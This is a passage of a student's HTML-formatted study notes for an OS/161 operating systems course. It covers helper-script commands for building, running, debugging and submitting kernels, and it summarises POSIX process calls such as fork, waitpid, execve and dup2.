    &lt;a href=&#34;#setting-up-on-a-new-machine&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Works even if a custom directory is used for OS/161&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# setup new machine&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py configure
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will copy the sys161.conf file. You will need to edit the CPUs and memory line. I recommend editing one of the commented out lines to have 4 CPUs and 4MB of memory and another one to be 4 CPUs with 2MB of memory.&lt;/p&gt;
&lt;h3 id=&#34;building-the-kernel&#34; &gt;Building the kernel
&lt;span&gt;
    &lt;a href=&#34;#building-the-kernel&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# configure new assignment (run once per assignment)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py new &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# build the kernel for an assignment&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py build &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you don&amp;rsquo;t use the script I wrote, you can &lt;del&gt;do the following&lt;/del&gt; read the source code or the course guide and figure out how to build the kernel manually. I&amp;rsquo;m purposely not providing the commands as I never used them after I wrote my script.&lt;/p&gt;
&lt;!-- ```sh
./config ASSTX  # run whenever adding or removing kernel files from kern.conf
# build the kernel
cd ../compile/ASSTX
bmake depend
bmake
bmake install
``` --&gt;
&lt;h3 id=&#34;running-the-kernel-on-a-simulator&#34; &gt;Running the kernel on a simulator
&lt;span&gt;
    &lt;a href=&#34;#running-the-kernel-on-a-simulator&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# run the last built? kernel or the one you choose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py run [uint]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;debugging&#34; &gt;Debugging
&lt;span&gt;
    &lt;a href=&#34;#debugging&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# gdb requires you to run the following in two different terminals&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py debug &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# second terminal. The everything before --breakpoints is mandatory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py debug attach &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt; --breakpoints file.c:30 file2.c:50
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In the second terminal, either spam the enter key or enter c to continue code execution as GDB pauses program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(gdb) c
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See &lt;a href=&#34;http://www.student.cs.uwaterloo.ca/~cs350/common/gdb.html&#34;&gt;Debugging with GDB&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;working-locally&#34; &gt;Working locally
&lt;span&gt;
    &lt;a href=&#34;#working-locally&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;To work locally, you will need docker.&lt;/p&gt;
&lt;h3 id=&#34;submitting-assignments&#34; &gt;Submitting Assignments
&lt;span&gt;
    &lt;a href=&#34;#submitting-assignments&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# submit and see grade later&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py submit &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;# internally calls:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#   cs350_submit os161/os161-1.99/kern/compile/ASST0 ASST0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;#   cs350_submit userspace/ASSTUSER0 ASSTUSER0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./cs350_cli.py grade &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;readelf&#34; &gt;Readelf
&lt;span&gt;
    &lt;a href=&#34;#readelf&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;You can use readelf to get metadata of a binary&lt;/p&gt;
&lt;h2 id=&#34;processes&#34; &gt;Processes
&lt;span&gt;
    &lt;a href=&#34;#processes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;A &lt;em&gt;process&lt;/em&gt; is an instance of a program running&lt;/li&gt;
&lt;li&gt;Processes can spawn child processes&lt;/li&gt;
&lt;li&gt;Utilizes CPU better (throughput), lower latency&lt;/li&gt;
&lt;li&gt;Simplicity of programming&lt;/li&gt;
&lt;li&gt;Own view of the machine with abstractions&lt;/li&gt;
&lt;li&gt;Programs don&amp;rsquo;t care which other programs are running&lt;/li&gt;
&lt;li&gt;Pointers are only relevant to one process&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;abstractions&#34; &gt;Abstractions
&lt;span&gt;
    &lt;a href=&#34;#abstractions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;address space&lt;/li&gt;
&lt;li&gt;open files&lt;/li&gt;
&lt;li&gt;virtual CPU&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sections&#34; &gt;Sections
&lt;span&gt;
    &lt;a href=&#34;#sections&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Programs have sections such as data and text&lt;/p&gt;
&lt;h3 id=&#34;creating-processes&#34; &gt;Creating processes
&lt;span&gt;
    &lt;a href=&#34;#creating-processes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Posix system calls available in &lt;code&gt;unistd.h&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;fork&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Creates a new process that is an exact copy of current one. Return process ID (PID) of new process to the parent. Returns 0 in child.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;waitpid&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; pid, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; *stat, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; opt);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;wait for process with id pid (-1 for any), set stat to the exit value, and opt is 0 or WNOHANG. Returns PID or -1 on error.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; status)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Current process ceases to exist.  non-zero is error by convention.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;kill&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; pid, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; sig);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Sends signal sig to process pid. SIGTERM most common value, application can catch it for cleanup. SIGKILL stronger as it always kills the process. HUP stands for hang up or &amp;ldquo;reload configuration.&amp;rdquo;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;execve&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *prog, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; **argv, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; **envp);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;prog - absolute path of program run
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;argv - arguments to pass to main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;envp - environment variables
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Usually called through wrapper functions. Executes new program. Does not spawn that program. Replaces current program with that program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;execvp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *prog, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; **argv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// Searches PATH for prog
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;execlp&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *prog, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; *arg, ...)l
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// List arguments one at a time, finish with NULL
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;dup2&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; oldfd, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; newfd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// closes newfd if it was a valid descriptor
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// makes newfd an exact copy of oldfd
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// same offset on both
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// stdin is 0, stdout is 1, stderr is 2.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;fcntl&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; fd, F_SETFD, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; val);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// sets close on exec flag if val = 1, clears if val = 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// sets file descriptor non-inheritable by new program
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;perror&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; * arg)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Error friendly print&lt;/p&gt;
&lt;h3 id=&#34;pipes&#34; &gt;Pipes
&lt;span&gt;
    &lt;a href=&#34;#pipes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
